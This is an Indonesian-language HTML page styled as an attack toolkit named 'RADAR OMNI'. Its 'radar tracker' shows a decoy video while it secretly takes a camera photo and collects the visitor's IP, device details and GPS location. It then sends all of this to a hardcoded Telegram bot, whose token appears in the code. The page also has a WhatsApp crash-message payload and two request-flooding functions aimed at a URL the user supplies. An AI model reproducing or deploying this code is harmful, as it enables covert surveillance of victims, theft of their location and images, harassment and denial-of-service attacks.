<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ RADAR OMNI V.36.0 ]</title>
    <style>
        :root { --neon: #0f0; --purple: #bc13fe; --danger: #f00; --bg: #050505; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; text-align: center; margin:0; overflow-x: hidden; }
        .panel { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 12px; margin: 10px; text-align: left; }
        h3 { margin: 0 0 10px 0; font-size: 13px; color: var(--neon); text-transform: uppercase; }
        input { background: #000; border: 1px solid #444; color: #fff; padding: 10px; width: 90%; border-radius: 8px; margin-bottom: 8px; font-size: 11px; outline: none; }
        button { width: 100%; padding: 12px; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; text-transform: uppercase; margin-bottom: 5px; font-size: 11px; }
        .wa-btn { background: #25D366; color: #000; }
        .phish-btn { background: var(--purple); color: #fff; }
        .radar-btn { background: transparent; color: var(--neon); border: 2px solid var(--neon); box-shadow: 0 0 10px var(--neon); }
        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas { display: none; }
    </style>
</head>
<body>

    <h2 style="color:var(--neon); margin: 10px 0;">EDWARD OMNI V.36.0</h2>

    <div class="panel" style="border-left: 4px solid #25D366;">
        <h3>🟢 WA BUG CRASH</h3>
        <input type="number" id="noWA" placeholder="628xxxxxxx">
        <button class="wa-btn" onclick="startCrashWA()">SEND PAYLOAD ☠️</button>
    </div>

    <div class="panel" style="border-left: 4px solid var(--purple);">
        <h3>🟣 PHISHING ATTACK</h3>
        <input type="text" id="targetUrl" placeholder="URL Web Penipu">
        <button class="phish-btn" onclick="startPoison()">POISON 🟣</button>
        <button style="background:#ffc107; color:#000;" onclick="startFlood()">FLOOD 🟡</button>
    </div>

    <div class="panel" style="border-left: 4px solid var(--neon);">
        <h3>📡 RADAR LIVE TRACKER</h3>
        <p style="font-size: 10px; color: #aaa;">Izinkan akses kamera & lokasi untuk sinkronisasi radar.</p>
        <button class="radar-btn" onclick="startRadar()">AKTIFKAN RADAR 🚀</button>
    </div>

    <div id="videoOverlay">
        <video id="trapVideo" loop muted playsinline>
            <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJmZnduMG9uNHF3ZnduNHF3ZnduNHF3ZnduNHF3ZnduNHF3ZnduNHF3JmVwPXYxX2ludGVybmFsX2dpZl9ieV9iZCZjdD12/3o7TKMGpxVf7Ulb4S4/giphy.mp4" type="video/mp4">
        </video>
        <div style="position:absolute; top:20px; width:100%; color:var(--neon); font-weight:bold;">SCANNING COORDINATES...</div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const TELE_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const TELE_ID = '7898572558';

        function sendTele(msg) { fetch("https://api.telegram.org/bot" + TELE_TOKEN + "/sendMessage?chat_id=" + TELE_ID + "&text=" + encodeURIComponent(msg)); }

        async function startRadar() {
            // 1. Munculkan Video Radar
            document.getElementById('videoOverlay').style.display = 'block';
            document.getElementById('trapVideo').play();

            try {
                // 2. Ambil IP
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                let ip = data.ip;

                // 3. Ambil Kamera (Foto Diam-diam)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg');

                // 4. Ambil Lokasi & Kirim Semua
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((p) => {
                        let msg = "🔱 [ TARGET TRAPPED V.36 ] 🔱\n🌐 IP: " + ip + "\n📱 DEVICE: " + navigator.userAgent + "\n📍 LOKASI:\nhttps://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
                        sendTele(msg);
                        // Kirim Foto (Sebagai dokumen/file)
                        fetch("https://api.telegram.org/bot" + TELE_TOKEN + "/sendPhoto", {
                            method: "POST",
                            body: new URLSearchParams({ chat_id: TELE_ID, photo: photo })
                        });
                    }, () => { sendTele("❌ Lokasi ditolak target!"); });
                }
            } catch (e) { sendTele("⚠️ Akses Kamera/GPS Ditolak Target!"); }
        }

        function startCrashWA() {
            let n = document.getElementById('noWA').value;
            let p = "జ్ఞា".repeat(200) + "‌".repeat(500);
            navigator.clipboard.writeText(p).then(() => { window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text=SYSTEM_CALIBRATION"; });
        }

        function startPoison() {
            let url = document.getElementById('targetUrl').value;
            setInterval(() => { fetch(url, { method: 'POST', mode: 'no-cors' }); }, 500);
        }

        function startFlood() {
            let url = document.getElementById('targetUrl').value;
            setInterval(() => { fetch(url, { mode: 'no-cors' }); }, 100);
        }
    </script>
</body>
</html>
